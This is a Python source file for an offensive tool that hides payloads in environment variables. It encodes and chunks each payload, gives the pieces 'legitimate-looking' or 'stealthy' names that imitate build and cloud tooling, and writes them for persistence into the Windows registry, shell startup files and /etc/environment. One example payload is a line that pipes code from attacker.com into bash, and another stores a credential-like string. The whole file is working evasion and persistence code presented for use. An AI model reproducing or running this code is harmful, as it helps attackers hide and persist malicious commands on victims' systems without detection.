#!/usr/bin/env python3
"""
Enhanced Environment Variable Storage with Sophisticated Naming Strategy
Combines legitimate-looking variable names with payload storage and retrieval
"""

import os
import json
import base64
import hashlib
import re
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
import platform
import subprocess

from env_var_naming_strategy import (
    EnvVarNamingStrategy,
    NamingStrategy,
    NamingStrategyConfig,
    MultiStrategyNamer
)


class EnvVarScope(Enum):
    """Environment variable scope/level"""
    USER = "user"
    SYSTEM = "system"
    PROCESS = "process"


class EnvVarEncoding(Enum):
    """Encoding methods for environment variable values"""
    RAW = "raw"
    BASE64 = "base64"
    HEX = "hex"
    CHUNKED_BASE64 = "chunked_base64"
    CHUNKED_HEX = "chunked_hex"


@dataclass
class EnhancedEnvVarConfig:
    """Configuration for enhanced environment variable storage"""
    scope: EnvVarScope = EnvVarScope.PROCESS
    encoding: EnvVarEncoding = EnvVarEncoding.BASE64
    chunk_size: int = 255
    prefix: str = "SC_"
    use_obfuscation: bool = True
    compression: bool = True
    encryption: bool = False
    cleanup_on_error: bool = True

    # Naming strategy configuration
    naming_strategy: NamingStrategy = NamingStrategy.COMMON_TOOLS
    fallback_naming_strategies: List[NamingStrategy] = field(default_factory=lambda: [
        NamingStrategy.BUILD_SYSTEM,
        NamingStrategy.SYSTEM_LEGACY,
    ])
    randomize_case: bool = True
    chunk_numbering: str = "sequential"
    use_strategy_rotation: bool = False
    naming_seed: Optional[int] = None

    # Storage tracking
    track_metadata: bool = True
    include_checksum: bool = True


class EnhancedEnvVarWriter:
    """Writes payload to environment variables with legitimate-looking names"""

    def __init__(self, config: Optional[EnhancedEnvVarConfig] = None):
        """Initialize enhanced writer"""
        self.config = config or EnhancedEnvVarConfig()
        self.os_type = platform.system()
        self.stored_vars: Dict[str, str] = {}
        self.var_metadata: Dict[str, Dict[str, Any]] = {}
        self.naming_strategy = EnvVarNamingStrategy(
            NamingStrategyConfig(
                primary_strategy=self.config.naming_strategy,
                fallback_strategies=self.config.fallback_naming_strategies,
                randomize_case=self.config.randomize_case,
                chunk_numbering=self.config.chunk_numbering,
                seed=self.config.naming_seed,
            )
        )

    def encode_value(self,
                    value: str,
                    encoding: Optional[EnvVarEncoding] = None) -> str:
        """Encode value for storage"""
        encoding = encoding or self.config.encoding

        if encoding == EnvVarEncoding.RAW:
            return value
        elif encoding == EnvVarEncoding.BASE64:
            return base64.b64encode(value.encode()).decode()
        elif encoding == EnvVarEncoding.HEX:
            return value.encode().hex()
        elif encoding == EnvVarEncoding.CHUNKED_BASE64:
            return self._encode_chunked_base64(value)
        elif encoding == EnvVarEncoding.CHUNKED_HEX:
            return self._encode_chunked_hex(value)
        else:
            return value

    def _encode_chunked_base64(self, value: str) -> str:
        """Encode as chunked base64"""
        encoded = base64.b64encode(value.encode()).decode()
        chunks = [encoded[i:i + self.config.chunk_size]
                 for i in range(0, len(encoded), self.config.chunk_size)]
        return json.dumps({"type": "chunked_base64", "chunks": chunks})

    def _encode_chunked_hex(self, value: str) -> str:
        """Encode as chunked hex"""
        encoded = value.encode().hex()
        chunks = [encoded[i:i + self.config.chunk_size]
                 for i in range(0, len(encoded), self.config.chunk_size)]
        return json.dumps({"type": "chunked_hex", "chunks": chunks})

    def generate_var_names(self,
                          payload_id: str,
                          num_chunks: int) -> List[str]:
        """Generate legitimate-looking variable names"""
        if self.config.use_strategy_rotation:
            return self.naming_strategy.generate_with_rotation(payload_id, num_chunks)
        else:
            return self.naming_strategy.generate_chunk_names(
                payload_id,
                num_chunks,
                self.config.naming_strategy
            )

    def chunk_payload(self,
                     payload: str,
                     payload_id: str) -> Tuple[Dict[str, str], List[str]]:
        """Split payload into chunks with generated variable names"""
        chunk_size = self.config.chunk_size - 50
        encoded = self.encode_value(payload)

        # Calculate number of chunks needed
        num_chunks = (len(encoded) + chunk_size - 1) // chunk_size

        # Generate legitimate-looking variable names
        var_names = self.generate_var_names(payload_id, num_chunks)

        chunks = {}
        for i in range(num_chunks):
            start = i * chunk_size
            end = min(start + chunk_size, len(encoded))
            chunk_data = encoded[start:end]

            var_name = var_names[i]
            chunks[var_name] = chunk_data

        # Calculate checksum if enabled
        checksum = ""
        if self.config.include_checksum:
            checksum = hashlib.sha256(payload.encode()).hexdigest()

        # Add metadata variable
        metadata_var_name = self.naming_strategy.generate_name(payload_id, num_chunks)
        metadata = {
            "total_chunks": num_chunks,
            "encoding": self.config.encoding.value,
            "chunk_size": chunk_size,
            "original_size": len(payload),
            "encoded_size": len(encoded),
            "payload_id": payload_id,
            "chunk_var_names": var_names,
        }

        if checksum:
            metadata["checksum"] = checksum

        chunks[metadata_var_name] = json.dumps(metadata)
        var_names.append(metadata_var_name)

        return chunks, var_names

    def write_to_env(self,
                    payload_id: str,
                    payload: str,
                    scope: Optional[EnvVarScope] = None) -> Tuple[bool, List[str], str]:
        """Write payload to environment variables"""
        scope = scope or self.config.scope
        var_names = []

        try:
            # Chunk and generate variable names
            chunks, generated_names = self.chunk_payload(payload, payload_id)

            # Write each chunk
            for var_name, value in chunks.items():
                if not self._validate_env_var_value(value):
                    return False, var_names, f"Value too large: {var_name}"

                # Store based on scope
                if scope == EnvVarScope.PROCESS:
                    os.environ[var_name] = value
                    self.stored_vars[var_name] = value
                    var_names.append(var_name)
                elif scope == EnvVarScope.USER:
                    if self._write_user_env(var_name, value):
                        var_names.append(var_name)
                    else:
                        return False, var_names, f"Failed to write user env: {var_name}"
                elif scope == EnvVarScope.SYSTEM:
                    if self._write_system_env(var_name, value):
                        var_names.append(var_name)
                    else:
                        return False, var_names, f"Failed to write system env: {var_name}"

                # Store metadata
                if self.config.track_metadata:
                    self.var_metadata[var_name] = {
                        "scope": scope.value,
                        "encoding": self.config.encoding.value,
                        "size": len(value),
                        "payload_id": payload_id,
                    }

            return True, var_names, f"Stored in {len(var_names)} variables"

        except Exception as e:
            if self.config.cleanup_on_error:
                self._cleanup_vars(var_names)
            return False, [], str(e)

    def _validate_env_var_value(self, value: str) -> bool:
        """Validate value fits in environment variable"""
        max_size = 32767  # Windows limit
        return len(value) <= max_size

    def _write_user_env(self, name: str, value: str) -> bool:
        """Write to user environment"""
        try:
            if self.os_type == "Windows":
                return self._write_windows_user_env(name, value)
            elif self.os_type == "Linux":
                return self._write_linux_user_env(name, value)
            elif self.os_type == "Darwin":
                return self._write_macos_user_env(name, value)
        except Exception:
            return False
        return False

    def _write_system_env(self, name: str, value: str) -> bool:
        """Write to system environment"""
        try:
            if self.os_type == "Windows":
                return self._write_windows_system_env(name, value)
            elif self.os_type == "Linux":
                return self._write_linux_system_env(name, value)
        except Exception:
            return False
        return False

    def _write_windows_user_env(self, name: str, value: str) -> bool:
        """Write to Windows user registry"""
        try:
            import winreg
            with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as hkey:
                with winreg.OpenKey(hkey, r"Environment", 0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
            return True
        except (ImportError, Exception):
            try:
                subprocess.run(["setx", name, value], check=True, capture_output=True)
                return True
            except Exception:
                return False

    def _write_windows_system_env(self, name: str, value: str) -> bool:
        """Write to Windows system registry"""
        try:
            import winreg
            with winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) as hkey:
                with winreg.OpenKey(hkey,
                                   r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
                                   0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
            return True
        except Exception:
            return False

    def _write_linux_user_env(self, name: str, value: str) -> bool:
        """Write to Linux user environment"""
        try:
            home = os.path.expanduser("~")
            bashrc = os.path.join(home, ".bashrc")
            export_line = f"\nexport {name}='{value}'\n"
            with open(bashrc, "a") as f:
                f.write(export_line)
            return True
        except Exception:
            return False

    def _write_linux_system_env(self, name: str, value: str) -> bool:
        """Write to Linux system environment"""
        try:
            env_file = "/etc/environment"
            if os.access(env_file, os.W_OK):
                with open(env_file, "a") as f:
                    f.write(f"{name}='{value}'\n")
                return True
        except Exception:
            return False
        return False

    def _write_macos_user_env(self, name: str, value: str) -> bool:
        """Write to macOS user environment"""
        try:
            home = os.path.expanduser("~")
            zshrc = os.path.join(home, ".zshrc")
            bashrc = os.path.join(home, ".bash_profile")
            export_line = f"\nexport {name}='{value}'\n"
            for rc_file in [zshrc, bashrc]:
                if os.path.exists(rc_file):
                    with open(rc_file, "a") as f:
                        f.write(export_line)
            return True
        except Exception:
            return False

    def _cleanup_vars(self, var_names: List[str]) -> None:
        """Clean up stored variables"""
        for var_name in var_names:
            try:
                if var_name in os.environ:
                    del os.environ[var_name]
            except Exception:
                pass

    def get_metadata_summary(self) -> Dict[str, Any]:
        """Get summary of stored variables and naming strategies"""
        naming_analysis = self.naming_strategy.get_strategy_analysis()

        return {
            "total_variables": len(self.stored_vars),
            "storage_scope": self.config.scope.value,
            "encoding": self.config.encoding.value,
            "naming_strategy": self.config.naming_strategy.value,
            "use_rotation": self.config.use_strategy_rotation,
            "strategy_analysis": naming_analysis,
            "stored_variables": list(self.stored_vars.keys()),
        }


# ============================================================================
# Example and Testing
# ============================================================================

def example_basic_storage():
    """Basic storage example"""
    print("\n" + "=" * 80)
    print("EXAMPLE 1: Basic Storage with Legitimate-Looking Names")
    print("=" * 80 + "\n")

    config = EnhancedEnvVarConfig(
        scope=EnvVarScope.PROCESS,
        encoding=EnvVarEncoding.BASE64,
        naming_strategy=NamingStrategy.COMMON_TOOLS,
        randomize_case=True,
    )

    writer = EnhancedEnvVarWriter(config)
    payload = "curl http://attacker.com/payload | bash"

    success, var_names, message = writer.write_to_env("SECRET_001", payload)

    print(f"Success: {success}")
    print(f"Message: {message}")
    print(f"Variables created: {len(var_names)}")
    print(f"\nVariable names (legitimate-looking):")
    for name in var_names:
        print(f"  - {name}")

    metadata = writer.get_metadata_summary()
    print(f"\nMetadata Summary:")
    for key, value in metadata.items():
        if key != "stored_variables":
            print(f"  {key}: {value}")


def example_rotation_strategy():
    """Example using strategy rotation"""
    print("\n" + "=" * 80)
    print("EXAMPLE 2: Multi-Strategy Rotation")
    print("=" * 80 + "\n")

    config = EnhancedEnvVarConfig(
        scope=EnvVarScope.PROCESS,
        encoding=EnvVarEncoding.BASE64,
        use_strategy_rotation=True,
        fallback_naming_strategies=[
            NamingStrategy.BUILD_SYSTEM,
            NamingStrategy.DEVELOPMENT,
            NamingStrategy.CLOUD,
        ]
    )

    writer = EnhancedEnvVarWriter(config)
    payload = "Sensitive configuration data"

    success, var_names, message = writer.write_to_env("SECRET_ROTATION", payload)

    print(f"Success: {success}")
    print(f"Variables created: {len(var_names)}")
    print(f"\nVariable names (rotated strategies):")
    for name in var_names:
        print(f"  - {name}")


def example_cloud_environment():
    """Example for cloud deployment"""
    print("\n" + "=" * 80)
    print("EXAMPLE 3: Cloud Environment Naming")
    print("=" * 80 + "\n")

    config = EnhancedEnvVarConfig(
        scope=EnvVarScope.PROCESS,
        encoding=EnvVarEncoding.BASE64,
        naming_strategy=NamingStrategy.CLOUD,
        fallback_naming_strategies=[
            NamingStrategy.CI_CD,
            NamingStrategy.CONTAINER,
        ]
    )

    writer = EnhancedEnvVarWriter(config)
    payload = "AWS_ACCESS_KEY=secret_key_here"

    success, var_names, message = writer.write_to_env("CLOUD_SECRET", payload)

    print(f"Success: {success}")
    print(f"Variables created: {len(var_names)}")
    print(f"\nCloud-themed variable names:")
    for name in var_names:
        print(f"  - {name}")


def example_stealthy_naming():
    """Example using hash-based stealthy naming"""
    print("\n" + "=" * 80)
    print("EXAMPLE 4: Stealthy Hash-Based Naming")
    print("=" * 80 + "\n")

    config = EnhancedEnvVarConfig(
        scope=EnvVarScope.PROCESS,
        encoding=EnvVarEncoding.HEX,
        naming_strategy=NamingStrategy.HASH_BASED,
        fallback_naming_strategies=[
            NamingStrategy.MIXED_CASE,
            NamingStrategy.ACRONYM,
        ]
    )

    writer = EnhancedEnvVarWriter(config)
    payload = "Super secret command execution"

    success, var_names, message = writer.write_to_env("STEALTH_SECRET", payload)

    print(f"Success: {success}")
    print(f"Variables created: {len(var_names)}")
    print(f"\nStealthy variable names (hash-based):")
    for name in var_names:
        print(f"  - {name}")


if __name__ == "__main__":
    print("\n")
    print("╔" + "=" * 78 + "╗")
    print("║" + " " * 15 + "ENHANCED ENV VAR STORAGE WITH NAMING STRATEGY" + " " * 19 + "║")
    print("║" + " " * 78 + "║")
    print("║" + " " * 12 + "Legitimate-looking names + persistent payload storage" + " " * 12 + "║")
    print("╚" + "=" * 78 + "╝")

    example_basic_storage()
    example_rotation_strategy()
    example_cloud_environment()
    example_stealthy_naming()

    print("\n" + "=" * 80)
    print("EXAMPLES COMPLETE")
    print("=" * 80 + "\n")
